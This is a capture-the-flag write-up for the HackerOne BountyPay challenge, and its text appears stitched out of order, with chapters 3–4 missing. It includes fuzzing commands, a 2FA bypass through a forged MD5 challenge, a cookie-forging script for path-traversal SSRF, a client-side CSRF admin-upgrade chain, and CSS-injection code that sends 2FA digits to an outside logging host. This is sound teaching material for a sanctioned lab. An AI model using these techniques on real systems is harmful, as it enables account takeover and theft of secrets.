To end everything, here's some quick advice for anyone just starting out in this Bug Bounty game: Have patience and appreciate the process! It takes a while to get your first bounty, but you will get it. And then the second one. Then a year goes by, the knowledge stacks up, and you get more bounties than you can count.

## References
1. https://blog.detectify.com/2019/01/10/what-is-server-side-request-forgery-ssrf/
1. https://blog.detectify.com/2019/05/16/the-real-impact-of-an-open-redirect/
1. https://firebase.google.com/docs/web/setup
1. https://firebase.google.com/docs/database/web/start

1. https://github.com/ffuf/ffuf
1. https://github.com/internetwache/GitTools
1. https://github.com/michenriksen/aquatone
1. https://ibotpeaches.github.io/Apktool/documentation/
1. https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b
1. https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d

activities.markdown_message:
Foreword

This starts like any other fairy tale. The hero, aka me, was chilling after a long day of conquering web applications. He was scrolling Twitter to keep up with everything new in the infosec community.

In these kinds of stories, you all know what's next. Something unexpected happens that would change the hero forever.

This comes in the form of a tweet, at 8:39 PM in the hero's timezone, on a Friday.

At that moment, our protagonist knew that he had a worthy mission! A mission to deliver the bounties to all the hackers who did their job of protecting the safety of millions of internet users. #TogetherWeHitHarder

This write-up is for my beginner self. The one that was very overwhelmed with every resource on security, but didn't yet know how to approach a web application. It has all the details I would have liked to know when I started. I hope that it reaches hackers in the same position as I was a year ago and points them in the right direction.

Chapter 1 - Reconnaissance-by-fire

It all starts with the policy and scope. I visited https://hackerone.com/h1-ctf to understand what I'm allowed to do.

The main target is a wildcard domain - *.bountypay.h1ctf.com. Anything on the out of scope part that would be included in this wildcard? Nope. Then we're good to go!

I proceeded to enumerate subdomains to understand the attack surface. For this task, we will use findomain because it's really fast in passive mode.

$ findomain -t bountypay.h1ctf.com

Target ==> bountypay.h1ctf.com

Searching in the CertSpotter API... 🔍
Searching in the Bufferover API... 🔍
Searching in the Crtsh database API... 🔍
Searching in the Sublist3r API... 🔍
Searching in the Spyse API... 🔍
Searching in the Urlscan.io API... 🔍
Searching in the AnubisDB API... 🔍
Searching in the Threatminer API... 🔍
Searching in the Virustotal API... 🔍
Searching in the Facebook API... 🔍
Searching in the Threatcrowd API... 🔍

api.bountypay.h1ctf.com
app.bountypay.h1ctf.com
software.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
www.bountypay.h1ctf.com
bountypay.h1ctf.com

A total of 6 subdomains were found for domain bountypay.h1ctf.com 👽 in 1 second.⏲️

Good luck Hax0r 💀!

I think that's all the surface we need so far.

I started a directory brute force with ffuf (best tool ever) and common.txt wordlist from SecLists. I let this run in the background while I did my manual recon.

Usually, at this step, I would use aquatone to grab screenshots of all domains. But in this case, I opened all of them one by one in my browser.

Let's start with bountypay.h1ctf.com. It's a basic front page with links to app.bountypay.h1ctf.com and staff.bountypay.h1ctf.com. Nothing much interesting here. The www subdomain at www.bountypay.h1ctf.com points to the same page.

The app subdomain at app.bountypay.h1ctf.com is a login page. I tried admin:admin for the kicks, but it failed.

The staff subdomain at staff.bountypay.h1ctf.com is a login page too. It presents something interesting right off the bat, which is the template parameter. Let's do some basic fuzzing.

Might this cause a Local File Inclusion / Disclosure vulnerability? We have template=login, let's try template=./login. But no luck.

Then I proceeded to do brute force the parameter to maybe disclose more templates.

$ ffuf -u 'https://staff.bountypay.h1ctf.com/?template=FUZZ' -w common.txt -ac

        /'___\  /'___\           / ___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : https://staff.bountypay.h1ctf.com/?template=FUZZ
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response words: 1
________________________________________________

admin                   [Status: 200, Size: 26, Words: 5, Lines: 1]
login                   [Status: 200, Size: 1348, Words: 337, Lines: 34]
:: Progress: [4652/4652] :: Job [1/1] :: 332 req/sec :: Duration: [0:00:14] :: Errors: 0 ::

Hmm, admin was found. What is there?

$ curl 'https://staff.bountypay.h1ctf.com/?template=admin' -i
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: keep-alive

No Access to this resource

I wrote it in my notes and moved on to the next target.

This is an interesting index page at software.bountypay.h1ctf.com. We will get the results from the directory brute force in a bit, but for now, this gets noted. The things that make it special is not only the 401 but the special error "You do not have permission to access this server from your IP Address". Possibly a hint!

Last but not least is api.bountypay.h1ctf.com. The first thing I noticed on this page is the link on REST API. It points to /redirect?url=https://www.google.com/search?q=REST+API. Hmm, this might be an Open Redirect.

Let's do some fuzzing. I tried to redirect to hackerone.com, only to be met by an error.

$ curl 'https://api.bountypay.h1ctf.com/redirect?url=https://www.hackerone.com/'
URL NOT FOUND IN WHITELIST

I tried a few more tricks, like using just //domain.com/ without the protocol, or checking for subdomains. Then I figured that *.bountypay.h1ctf.com might be on the whitelist.

$ curl 'https://api.bountypay.h1ctf.com/redirect?url=https://api.bountypay.h1ctf.com/' -i
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Location: https://api.bountypay.h1ctf.com/

Good, good! This might be useful in a SSRF (Server Side Forgery Request) attack. I noted everything about I know about it for now and moved on because this is a Low Impact vulnerability and I need to learn about the attack surface of the app more in-depth before putting in the time for a proper bypass.

Directory brute forcing just finished. The only interesting thing that resulted from this is the /.git/HEAD on app.bountypay.h1ctf.com. Exposed .git folders are a common mistake and they usually lead to source code disclosure. You can read more about this particular issue in this article from pentester.land.

My first thought when I saw it was to use a tool called GitTools Dumper to download the source code. But... umm. It didn't work. Maybe /.git/config can point us in the right direction?!

$ curl 'https://app.bountypay.h1ctf.com/.git/config'
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true
[remote "origin"]
    url = https://github.com/bounty-pay-code/request-logger.git
    fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
    remote = origin
    merge = refs/heads/master

Wow, wow, wow! That's a GitHub repository. Is it public? It is! Holy Moly! We have Source Code Leak. It seems to only contain one file - logger.php

This file is pointing to bp_web_trace.log. Maybe that file is exposed as well? Considering that the .git directory was exposed.

$ curl 'https://app.bountypay.h1ctf.com/bp_web_trace.log'
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==

This looks like base64. I usually use CyberChef to decode almost everything. After decoding, the logs above look like this:

1588931909:{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
1588931919:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
1588931928:{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
1588931945:{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}

It seems that we have the credentials for brian.oliver. Are they valid? Is this the end? What about Mårten?

It's time for some commercials! We'll be right back!

Chapter 2 - Don't roll your own anything

Welcome back to another chapter of Doing CTFs Without Sleep!

I didn't yet mention anything about Burp Suite. Well, it's the most wonderful hacking tool in the entire universe! If I would only have to pick one tool, this would be it. No joke!

I opened Burp, set up the scope to bountypay, then I checked the following Response Modifications: Unhide hidden form fields and Enable disabled form fields.

Then I opened my browser on https://app.bountypay.h1ctf.com/ and tried the following credentials:

Username: brian.oliver
Password: V7h0inzX

But a *wild* 2FA appears. In the logs, there was a possible answer for this: bD83Jk27dQ. It doesn't seem to work.

The next step would be to check that new field from the page. It has the name challenge, and our 2FA password has the input name challenge_answer, so they should be correlated somehow. How?

Rare Nahamsec has been spotted doing some proper trolling on Twitter.

Back to the challenge, this is the value of challenge field - 5ee8d386393ebbf7c8d0d4124bc78ed0. It looks like an MD5. I tried to see if there's a match for it on the internet (via hash toolkit and other tools), but I had no luck.
What if the reverse is possible? Use any value as the answer and change the challenge to the corresponding MD5.

Let's try with the answer a. I used CyberChef to hash it - md5("a") = 0cc175b9c0f1b6a831c399e269772661. And it worked, I was able to login as brian.oliver.

There's some new surface to take into consideration.

The page is simple, only has the Load Transactions bar which has some Javascript magic attached to it.

There is a new Javascript file at /js/app.js. Below is the important part of its content.

$(".loadTxns").click(function() {
    let t = $('select[name="month"]').val(),
        e = $('select[name="year"]').val();
    $(".txn-panel").html("");
    $.get("/statements?month=" + t + "&year=" + e, function(t) {
        if (t.hasOwnProperty("data")) {
            // -- snip --
        } else alert("Invalid Response From The Server")
    });
});

The only things it seems to be doing is a request to /statements with the month and year selected by the user. Let's replay the request with the help of curl and my cookie. And because I already know the content is JSON, I will be using jq to beautify.

$ curl 'https://app.bountypay.h1ctf.com/statements?month=01&year=2020' -H 'Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9' | jq
{
  "url": "https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=01&year=2020",
  "data": "{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"
}

I did some fuzzing on the two parameters with special characters to observe interesting behavior, but nothing happened. The two parameters may be converted to numbers because if I try 01"' as the month, it will be reflected as month=01.

Maybe new parameters? I put ffuf to work with a list from SecLists.

$ ffuf -u 'https://app.bountypay.h1ctf.com/statements?month=01&year=2020&FUZZ=test' -H 'Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9' -w ./burp-parameter-names.txt -fs 177 -mc all
year                    [Status: 400, Size: 31, Words: 5, Lines: 1]
month                   [Status: 400, Size: 31, Words: 5, Lines: 1]

Except for an error on using year or month with the value test, nothing special.

Maybe I can directly access that api.bountypay endpoint.

$ curl 'https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements?month=01&year=2020' -i
HTTP/1.1 401 Unauthorized
Server: nginx/1.14.0 (Ubuntu)
Content-Type: application/json
Connection: keep-alive

["Missing or invalid Token"]

Of course, the next logical step was to try with the Cookie header or the Token as a header. Neither worked.

Hmm. Let's check the cookie. It looks custom. And eyJ at the start usually means it's a JSON encoded with base64 - #l33tHackerTips.

{
  "account_id": "F8gHiqSdpK",
  "hash": "de235bffd23df6995ad4e0930baac1a2"
}

I don't know what the hash is yet, but I saw that Account ID before, reflected in the API request to /statements. It could be the same.

I played with it for a bit in the Burp Repeater, because it's really easy to do base64 transformations with the shortcuts: Encode with CTRL + B, Decode with CTRL + Shift + B.

The first thing I noticed is that if I change the account_id to test, the API request to /statements still works. Notice in the screenshot below that the URL reflects the new account_id.

Now, if I change the Account ID to # or ?, we would be able to have the request for ourselves. No more suffix.

{
  "url": "https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK#/statements?month=01&year=2020",
  "data": "{\"account_id\":\"F8gHiqSdpK\",\"owner\":\"Mr Brian Oliver\",\"company\":\"BountyPay Demo \"}"
}

This made me think that Path Traversal is also possible with ../.

{
  "url": "https://api.bountypay.h1ctf.com/api/accounts/../#/statements?month=01&year=2020",
  "data": "[\"Endpoint Not Found\"]"
}

I'm not very good at guessing paths, so the next logical step for me was to write a Python script for base64 transformation and pipe it to ffuf as a wordlist to brute force some directories.

import base64
import sys

prefix = sys.argv[1] if len(sys.argv) > 1 else ''
with open('/dev/stdin') as f:
    for item in f:
        account_id = prefix + item.strip() + '#'
        token = '{"account_id":"%s","hash":"de235bffd23df6995ad4e0930baac1a2"}' % account_id
        token = base64.b64encode(token.encode('utf8')).decode('utf8')
        print(token)

For the same directory (with ./ as the prefix), it didn't find anything.

For the same the Account Id ./F8gHiqSdpK/, it found only https://api.bountypay.h1ctf.com/api/accounts/F8gHiqSdpK/statements.

$ cat common.txt | python token-dirs.py '../' | ffuf -u 'https://app.bountypay.h1ctf.com/statements?month=01&year=2020' -H 'Cookie: token=FUZZ' -w - -fr 'Endpoint Not Found|404'
eyJhY2NvdW50X2lkIjoiLi4vc3RhZmYjIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0= [Status: 200, Size: 141, Words: 4, Lines: 1]

For one level depth ../, it found https://api.bountypay.h1ctf.com/api/staff. It is blocked without some "token".

For two levels depth ../../, it found https://api.bountypay.h1ctf.com/redirect. Wait, didn't I take a look at this a while ago? *scrolling through notes intensifies*. It is an endpoint that allows redirecting to *.bountypay.h1ctf.com and to google.com/search. I quickly remembered we have a weird subdomain at software.bountypay.h1ctf.com that might be interesting to check because of the 401 Not Authorized error.

I tried it first from my perspective by visiting https://api.bountypay.h1ctf.com/redirect?url=https://software.bountypay.h1ctf.com/. And the redirect works!

$ curl -i 'https://api.bountypay.h1ctf.com/redirect?url=https://software.bountypay.h1ctf.com/'
HTTP/1.1 302 Found
Server: nginx/1.14.0 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Location: https://software.bountypay.h1ctf.com/

Let's try ../../redirect?url=https://software.bountypay.h1ctf.com/ as account_id.

It magically works, because I can see the title of the page instead of that scary 401 error. Now what? It looks a bit like a login page, but I don't have an idea yet how to send POST requests with this Path Traversal to SSRF vulnerability.

While waiting for a better idea, I started a directory brute force process in the background.

$ cat common.txt | python token-dirs.py '../../redirect?url=https://software.bountypay.h1ctf.com/' | ffuf -u 'https://app.bountypay.h1ctf.com/statements?month=01&year=2020' -H 'Cookie: token=FUZZ' -w - -fr '404 Not Found'
eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS9jc3MjIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0= [Status: 200, Size: 368, Words: 5, Lines: 1]
eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS9pbWFnZXMjIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0= [Status: 200, Size: 371, Words: 5, Lines: 1]

Chapter 5 - Client-Side Surfing

It was almost 6 pm. Still on Saturday. I was really hoping I can solve this by Sunday.

I got the credentials for Sandra. Let's test them on https://staff.bountypay.h1ctf.com/

Username: sandra.allison
Password: s%3D8qB8zEpMnc*xsz7Yp5

They worked. I'm logged in. Before I do anything, I got to make sure I understand the attack surface really well. Here's a short clip of me clicking on everything in the application.

And below is the directory structure with every path discovered.

My primary instincts kicked in instantly when I saw the url parameter. The first thing I did was to send a request to /admin/report?url=myurl, where myurl was a bin from requestbin.net. No pingback. What about DNSBin? Nothing.

What if I'm not interacting properly with the endpoint? Let's dig into /js/website.js.

$(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team");
    });
    $("#myModal").modal("hide");
});

The report functionality sends a GET request to /admin/report?url=[...] with the variable url. That variable is not defined in the website.js file. It's actually defined on every page towards the end as a base64 of the current path and query. For example this one:

<script>
    var url = 'Lz90ZW1wbGF0ZT10aWNrZXQmdGlja2V0X2lkPTM1ODI='; // == b64('/?template=ticket&ticket_id=3582')
</script>
<script src="/js/website.js"></script>

Ok, so I need base64 and an URL without protocol, hostname or port. Maybe the redirect trick from before? I didn't find any /redirect endpoints. Maybe full URL still works, but I didn't try it with base64? Nope, no pingback.

From my experience with app.bountypay.h1ctf.com, cookies hold magical stuff. The Session Cookie for this one was something like c0lsdUVWbXlwYnp5L1VuMG[...]. Really long cookie. I decoded it once with base64, it resulted in another base64. Decode it again, got some binary data. Old tricks don't last. Check the full token in this CyberChef recipe.

Then I started playing with the profile functionality. User controls two fields: profile_name and profile_avatar. I tried for XSS vulnerabilities or any other types of injections, but everything was sanitized except for space, 0-9A-Za-z. You might be correctly wondering how do I know this?

I set the profile name and profile avatar to test !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ and they both returned test 0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.

To make things more readable, I changed both to test test0. I shifted my focus to the ticket page because if there's a Blind XSS or something, that's the only page that the admin can see the same as me. Noticed that everything is reflected as in the profile page ([0-9A-Za-z ]+). But something seems to be wrong with the avatar.

So the space character allows me to control the class of the avatar. Is there something exploitable here? I don't think so, no JS in CSS :(

Let's get deeper into website.js. Below is a beautified version:

$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin");
    });
});

$(".tab").click(function() {
    $(".tab").removeClass("active");
    $(this).addClass("active");
    $("div.content").addClass("hidden");
    $("div.content-" + $(this).attr("data-target")).removeClass("hidden");
});
// -- snipped send report function --

if (location.hash.length > 0) {
    "#tab1" === location.hash && $(".tab1").trigger("click");
    "#tab2" === location.hash && $(".tab2").trigger("click");
    "#tab3" === location.hash && $(".tab3").trigger("click");
    "#tab4" === location.hash && $(".tab4").trigger("click");
}

It took me a while to see it. I've read the file multiple times. Take your time if you want to follow along.

We control the avatar class. We can abusively put tab and upgradeToAdmin in it, and trigger it with the hash. This is "Client-Side" CSRF vulnerability. You should read this very good article on this type of issues by Facebook Bug Bounty.

Let's impersonate an attacker exploiting this vulnerability. They can set the avatar to tab1 upgradeToAdmin (because spaces are allowed), use the ticket page because it's visible to the admin, add #tab1 at the end and send it to the victim (aka admin). If the admin clicks on that link, the element with tab1 will automagically be clicked, which means the class upgradeToAdmin was also clicked. All of this from the context of the admin, who should have access to upgrade other users to admin.

Ok, it sounded 100% legit. Then, why is the request sent to /admin/upgrade?username=undefined. I think we forgot one small little thing. How am I going to set the username? Because the upgradeToAdmin functionality gets the username from an input tag with that name. I really, really hoped there would be some hidden element on that ticket page. But nope.

Where did we see an input tag for username? Maybe the profile page? Checked, no input tag. There sure was one on the login page. Can I access the login page even though I have a session? Yes, it's available. How do I set something in the username? Maybe it's reflected from the query? It's quite a frequent thing.

$ curl 'https://staff.bountypay.h1ctf.com/?template=login&username=sandra.allison'
<!-- snip -->
<div class="panel-body">
    <div style="margin-top:7px"><label>Username:</label></div>
    <div><input name="username" class="form-control" value="sandra.allison"></div>
    <div style="margin-top:7px"><label>Password:</label></div>
    <div><input name="password" type="password" class="form-control"></div>
</div>
<!-- snip -->

Yas! It's reflected exactly where I need it to be. I tried going off script and trying some XSS payloads, but it seems only the alphabetical characters and the dot character are allowed on this input tag. Using a Regular Expression, the filter would be ^[a-z.]+$.

The only problem is that the login page doesn't have the /js/website.js file included. Is there a way to combine the two templates?

After some attempts, I discovered that I can manipulate the page to render two templates at once using the templates as arrays - ?template[]=login&template[]=ticket.

I attempted to exploit myself with the following URL https://staff.bountypay.h1ctf.com/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab1. And the attempt was successful as it can be seen in the screenshot below, the request was sent to /admin/upgrade?username=sandra.allison. There's still the 401 Not Authorized problem, but that should work with admin permissions.

And for my next magic trick, I will require an assistant. Admin would you like to help me out? I'm so glad you offered!

I expect that the admin at /admin/report is running Javascript. We will know soon enough, won't we? I encoded my special path with base64 and accessed the following URL https://staff.bountypay.h1ctf.com/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJn[...]. It says Report received, like always.

Refreshing the home page there's a new Admin tab. And it contains some credentials. It smells like Christmas already!!!

There it is! Credentials for Mårten Mickos.

Stay tuned for the next chapter of our glorious adventure!

Chapter 6 - Closing in Style

I was having second doubts. What if Mårten calls the police on me if I log in as him? But I'm here to help my fellow hackers get their bounties paid.

After some moral considerations, I decided to go ahead and help out.

I had the following credentials:

Username: marten.mickos
Password: h&H5wy2Lggj*kKn4OD&Ype

I tried to log in on staff.bountypay.h1ctf.com. Not working. What about app.bountypay.h1ctf.com? Works. I bypassed the 2FA in the same way as I did in Chapter 2 for brian.oliver.

Nothing special to be observed. But I remembered that the initial tweet said something about May bug bounty payments. Let's check these.

The first I try to do with a new application is to explore the surface. In an intended way. While monitoring the requests in Burp.

It's asking for a 2FA code. Maybe the trick from before worked with MD5? Nopes.

As shown in the video, in the first step there's an URL to a CSS file. It looks out of place because it was a hidden input (Burp FTW!). By default, it points to /css/uni_2fa_style.css, which is a basic CSS file.

If I use my URL, maybe I can get a pingback? Let's try requestbin.net. No ping. There might be a problem with non-secure HTTP. Let's try ssrftest.com by @daeken. We got a hit!

GET https://ssrftest.com/x/XWdcn HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/83.0.4103.61 HeadlessChrome/83.0.4103.61 Safari/537.36
Connection: Keep-Alive
Sec-Fetch-Dest: style
X-Forwarded-Proto: https
Sec-Fetch-Mode: no-cors
Host: ssrftest.com
Sec-Fetch-Site: cross-site
Accept: text/css,*/*;q=0.1
X-Forwarded-For: 3.21.98.146
Accept-Language: en-US
Accept-Encoding: gzip

I always check the IP address to confirm it's not me who clicked on the payload. I ran the dig command on app.bountypay.h1ctf.com and it points to the same IP address as the X-Forwarded-For header above. Gotcha!

My theory is that the CSS is inserted on the 2FA page and loaded in a Headless Browser. In a real-life scenario, the victim would be clicking on the 2FA page they just received via email / SMS.

I knew a bit about CSS Injection but never encountered it before. Here's a quick read about the subject.

I did some recon on the page. I didn't even know the name of the input field. Or if the input field even exists. Let's do some CSS magic to exfiltrate the number of inputs.

input:nth-child(1) {
    background: url('https://ssrftest.com/target/log?link=XWdcn&data=input1');
}
/* --snip-- */
input:nth-child(10) {
    background: url('https://ssrftest.com/target/log?link=XWdcn&data=input10');
}

I wrote the CSS file above on my VPS (https is required for this to work). And waited for log messages on my SSRFTest instance... I got 7 hits back, which means there are 7 input fields.

Let's make this easier. There was a tool from @d0nutptr I've been meaning to try for a while. It comes with a very good writeup. I installed sic on the VPS and played with it for a bit, only to realize it would only work if the CSS is included via @import inside a style tag. It doesn't work if it's included with the link tag...

Back to the drawing board. Somewhere around this moment that I realized the 2FA answer on my page has a max length attribute of 7 characters. And the 2FA page has 7 input fields. What if there's one character per field? Wrote a quick Python script to generate all cases and exfiltrate (in order).

template = """
    input:nth-child(%d)[value^=%s] {
        background: url("https://ssrftest.com/target/log?link=XWdcn&data=%d%s");
    }
"""
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
for k in range(1, 8):
    for c in charset:
        print(template % (k, c, k, c))

I copied the CSS file to my VPS and sent the link in the payment process. And it worked. Below are the logs from SSRFTest:

Date Message
2020-05-30 20:25:02.935345 7T
2020-05-30 20:25:02.916710 6w
2020-05-30 20:25:02.914142 5o
2020-05-30 20:25:02.910506 4A
2020-05-30 20:25:02.906665 2Y
2020-05-30 20:25:02.902074 1A
2020-05-30 20:25:02.899542 3f

Fast, fast, fast! Copy logs, sort them, get the code, fill the 2FA answer and it worked! Finally! We got the FLAG! ^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$

It was about 8:33 PM when I submitted the FLAG. I took a well-deserved break for the rest of the weekend.

The hero's journey ends here. He goes back home where everything is the way it was. But nothing will ever be the same again!

Finish Line

I would like to send thanks to the organizers. The challenges were really great and I appreciate the effort put into this puzzle. I had a lot of fun because I had the opportunity to play around with a few bug classes that I don't normally encounter.

To end everything, here's some quick advice for anyone just starting out in this Bug Bounty game: Have patience and appreciate the process! It takes a while to get your first bounty, but you will get it. And then the second one. Then a year goes by, the knowledge stacks up, and you get more bounties than you can count.
